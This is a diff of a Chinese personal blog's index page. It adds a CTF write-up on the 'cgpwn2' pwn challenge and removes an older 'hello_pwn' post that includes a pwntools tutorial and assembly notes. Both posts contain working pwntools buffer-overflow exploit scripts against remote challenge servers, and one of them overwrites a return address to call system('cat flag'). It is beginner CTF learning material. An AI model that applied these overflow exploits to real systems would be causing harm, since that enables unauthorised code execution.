@@ -116,12 +116,12 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">6</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">7</span></a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">35</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">36</span></a>
 
   </li>
   </ul>
@@ -147,6 +147,70 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/26/AD-cgpwn2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="带废物">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="全宇宙最蒻的博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/03/26/AD-cgpwn2/" class="post-title-link" itemprop="url">AD_cgpwn2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2021-03-26 21:26:04 / Modified: 21:36:14" itemprop="dateCreated datePublished" datetime="2021-03-26T21:26:04+08:00">2021-03-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这题和level2很像，都是溢出覆盖返回地址，进入system函数。（一些其它细节在同level2）</p>
+<p>但本题没有提供system函数所需的关键字符串，所以可以在输入其它变量时输入想要的字符串，例如：cat flag。找出这个变量的地址，用p32打包给system函数做参数。</p>
+<img src="/2021/03/26/AD-cgpwn2/1.png" class>
+<p>值得一提的是，本题有两个system函数，都可以用。</p>
+<img src="/2021/03/26/AD-cgpwn2/2.png" class>
+<img src="/2021/03/26/AD-cgpwn2/3.png" class>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>, <span class="number">35786</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please tell me your name&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;hello,you can leave some message here:\n&quot;</span>)</span><br><span class="line">sys_add = <span class="number">0x08048420</span> <span class="comment"># 0x0804854D也行</span></span><br><span class="line">cmd_add = <span class="number">0x0804A080</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2A</span> + p32(sys_add) + p32(<span class="number">0</span>) + p32(cmd_add)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1006,127 +1070,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/12/18/AD-hello-pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="带废物">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="全宇宙最蒻的博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/12/18/AD-hello-pwn/" class="post-title-link" itemprop="url">AD_hello_pwn</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-12-18 18:54:01" itemprop="dateCreated datePublished" datetime="2020-12-18T18:54:01+08:00">2020-12-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-14 10:33:48" itemprop="dateModified" datetime="2021-03-14T10:33:48+08:00">2021-03-14</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <img src="/2020/12/18/AD-hello-pwn/1.jpg" class>
-<p>诶呀。。。。。。<br>没人告诉我pwntools是用python写的，我看到题解有python语法就先去学python语法，看半天找不到我要的，因为用法在pwntools里。<br>诶呀，恶心啊。。。。</p>
-<h1 id="Pwntools主要模块及其使用"><a href="#Pwntools主要模块及其使用" class="headerlink" title="Pwntools主要模块及其使用"></a>Pwntools主要模块及其使用</h1><p><strong>Tubes模块包含remote和process子模块</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">32152</span>)</span><br><span class="line"><span class="comment"># 与互联网主机交互</span></span><br><span class="line">io.sendline(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.send(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"><span class="comment"># sendline发送数据会在最后多添加一个回车</span></span><br><span class="line">io.recv(<span class="number">1024</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># recv()读取1024个字节，revuntil()读取到指定数据，recvline()会读取一直到回车</span></span><br><span class="line">io.interactive() <span class="comment">#爷不晓得</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">io = process(<span class="string">&quot;./bin&quot;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#启动本地程序进行交互，用于gdb调试</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">io.p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">io.u32(<span class="string">&quot;1234&quot;</span>)</span><br><span class="line">io.u64(<span class="string">&quot;12345678&quot;</span>)</span><br><span class="line"><span class="comment"># 将字节数组与数组进行以小端对齐的方式相互转化，32负责转化dword，64负责转化qword</span></span><br></pre></td></tr></table></figure>
-<p>之前昨天速成python是在本机VS2019（我现在还没找到解释器），现在去VMLinux写。</p>
-<p>太懒了，不下IDE了</p>
-<p><strong>新建文件</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; text.py</span><br></pre></td></tr></table></figure>
-<p>右键修改权限后可执行</p>
-<h1 id="做题"><a href="#做题" class="headerlink" title="做题"></a>做题</h1><p>本题附件用于反编译，查找漏洞，然后写脚本，用脚本连接对准环境直接攻击（我拿着脚本对附件打了半天）</p>
-<img src="/2020/12/18/AD-hello-pwn/3.jpg" class>
-<p>把附件先扔到IDA反编译</p>
-<img src="/2020/12/18/AD-hello-pwn/2.png" class>
-<p>你要是不晓得这是啥玩意，巧了，我也不知道</p>
-<p>写脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  <span class="comment">#导入pwntools的工具，我一开始在导入附件，别骂了</span></span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;bof&quot;</span>) <span class="comment">#读取到指定数据</span></span><br><span class="line">io.sendline(payload) <span class="comment">#发送数据</span></span><br><span class="line">io.interactive() <span class="comment">#爷不懂得</span></span><br></pre></td></tr></table></figure>
-<p>运行脚本，成功</p>
-<p><strong>爷太菜了，爷滚去看汇编了</strong></p>
-<p><strong>······</strong></p>
-<p><strong>一目十行速成汇编，我胡汉三又回来了</strong></p>
-<p>附件扔IDA，找到main得到一个结构</p>
-<img src="/2020/12/18/AD-hello-pwn/1.png" class>
-<p>反汇编得到一段伪c代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  alarm(0x3Cu);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  puts(&quot;~~ welcome to ctf ~~     &quot;);</span><br><span class="line">  puts(&quot;lets get helloworld for bof&quot;);</span><br><span class="line">  read(0, &amp;unk_601068, 0x10uLL);</span><br><span class="line">  if ( dword_60106C &#x3D;&#x3D; 1853186401 )</span><br><span class="line">    sub_400686();</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>代码里面有read函数，上网去找C语言read()函数的用法</p>
-<p>从文件中读取指定大小的字节函数read()</p>
-<p>原型：<code>ssize_t read(int fd,void*buf,size_t count)</code><br>参数说明：<br>fd:   是文件描述符，对应0<br>buf:   为读出数据的缓冲区<br>count:  为每次读取的字节数（是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移）<br>总结：read函数从指定的打开的文件fd中读取指定大小count的字节到从buf开始的缓冲区中。</p>
-<p>返回值:<br>若读取失败则返回-1。<br>读取成功则返回实际读取到的字节数,有两种情况:<br> [1].读取到的字节数小于count,这是在读取的文件的总字节数小于count。<br> [2].若读取到的字节数等于count,则在读取的文件的总字节数不小于count时发生。<br>注意:读取到的字节存放在buf缓冲区中,必须最后加上一个字节’\0’才能组成一个字符串</p>
-<p>回到题目<br>第一个参数为0，代表标准输入即从终端输入，第三个参数是输入的个数是0x10（uLL是unsigned long long），即16个字节。<br>将数据读到&amp;unk_601068（我猜）</p>
-<p>双击&amp;unk_601068和dword_60106C，IDA跳转到另一页面（IDA开始香了）<br><img src="/2020/12/18/AD-hello-pwn/4.png" class></p>
-<p>双击sub_400686()，跳转到：<br><img src="/2020/12/18/AD-hello-pwn/5.png" class><br>芜湖起飞</p>
-<p>也就是说只要dword_60106C=1853186401，就能拿到flag</p>
-<p>现在再看脚本了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">io=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">41392</span>) <span class="comment">#连接环境</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>) <span class="comment">#&#x27;a&#x27;*4代表偏移四个字节，p64()是pwntools工具，打包数据，64位</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;lets get hello world for bof&quot;</span>) <span class="comment">#读取代码直到这个位置</span></span><br><span class="line">io.sendline(payload) </span><br><span class="line"><span class="comment">#发送数据，写入到&amp;unk_601068，但我的数据使它偏移了4个字节，到了dword_60106C，写入数据</span></span><br><span class="line">io.interactive() <span class="comment">#将控制权交给用户</span></span><br></pre></td></tr></table></figure></p>
-<p>没有人比我更懂速成</p>
-<h1 id="IDA反编译汇编源代码复盘"><a href="#IDA反编译汇编源代码复盘" class="headerlink" title="IDA反编译汇编源代码复盘"></a>IDA反编译汇编源代码复盘</h1><p><strong>start 先于 main</strong></p>
-<p><strong>段寄存器说明语句</strong><br>在汇编语言源程序中可以定义多个段，每个段都要与一个段寄存器建立一种对应关系。建立这种对应关系的说明语句格式如下：</p>
-<p>assume 段寄存器名:段名[, 段寄存器名:段名, ……]</p>
-<p>其中：段寄存器是CS、DS、ES、SS、FS和GS，段名是在段定义语句说明时的段名。</p>
-<p>在一条assume语句中可建立多组段寄存器与段之间的关系，每种对应关系要用逗号分隔。例如，</p>
-<p>assume CS:code1, DS:data1</p>
-<p>上面的语句说明了：CS对应于代码段code1，DS对应于数据段data1。</p>
-<p>在assume语句中，还可以用关键字nothing来说明某个段寄存器不与任何段相对应。下面语句说明了段寄存器ES不与某段相对应。</p>
-<p>assume ES:nothing</p>
-<p>在通常情况下，代码段的第一条语句就是用assume语句来说明段寄存器与段之间的对应关系。在代码段的其它位置，还可以用另一个assume语句来改变前面assume语句所说明的对应关系，这样，代码段中的指令就用最近的assume语句所建立的对应关系来确定指令中的有关信息。</p>
-<p><strong>跨段寻址</strong><br>偶尔需要存取默认段以外的操作数，就要使用操作数段前缀。如，<br>mov ax,es:[si]<br>这条指令告诉cpu：要读取的数据不在当前数据段，而在附加段的si所指的地址。</p>
-<p><strong>segment</strong></p>
-<p>[格式]<br>segment_name SEGMENT [定位类型] [组合类型] [类别名]<br>···;here is your code<br>segment ends</p>
-<p>参数解释:</p>
-<p>[定位类型]<br>指明段开始的边界，如para，它使段定位在小段的边界，段首地址正好能被16整除，定位类型未指定时默认为para<br>段的定位类型有4种，分别是：<br>  page(页起始)，起始地址以00H结尾，能被256整除<br>  para (节起始)，起始地址以0H结尾，能被16整除<br>  word(字起始)，起始地址末位为0，是偶地址<br>  byte (字节起始)，起始地址为任意边界</p>
-<p>[组合类型]<br>决定本段是否要和其他段组合在一起，组合类型有：stack，common，public</p>
-<p>[类别名]<br>连接时用于相关段组合在一起，如代码段’code’，数据段’Data’，堆栈段’Stack’</p>
-<p>例子: stack segment para stack ‘stack’<br>解释: para表明该段起始地址对齐到para。 1 para= 16 bytes。stack声明该段是堆栈段，这样在最后的链接link时，会将该最终创建的exe文件头部的SS：SP域指向该段的末尾<br>‘stack’表明该段的组合名为’stack’。同一程序不同模块中，相同组合名的段会组合到一起。组合名也决定了最后exe文件中各个段的排列顺序</p>
-<p><strong>hlt</strong><br>HLT是暂停指令，当计算机程序运行一条HLT指令的时候，处理器就会进入传统的暂停模式。bai部的时钟信号停止下来了。在收到中断指令后，处理器又可以回到正常运作形态，同时时钟信号也恢复正常。 </p>
-<p><strong>栈堆相关寄存器</strong><br>运行时堆栈是内存数组，CPU用ESP寄存器（堆栈指针寄存器），对其进行管理。<br>ESP存放的是堆栈中某个位置的32位偏移量，每个堆栈位置都是32位长。<br>对应64位下的rsp（低位为esp）</p>
-<p>几个常用的寄存器<br>sp/esp/rsp（16bit/32bit/64bit）栈寄存器—-指向栈顶<br>bp/ebp/rbp 栈基址寄存器—-指向栈底<br>ip/eip/rip 程序指令寄存器—-指向下一条待执行指令</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1196,14 +1139,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-count">36</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
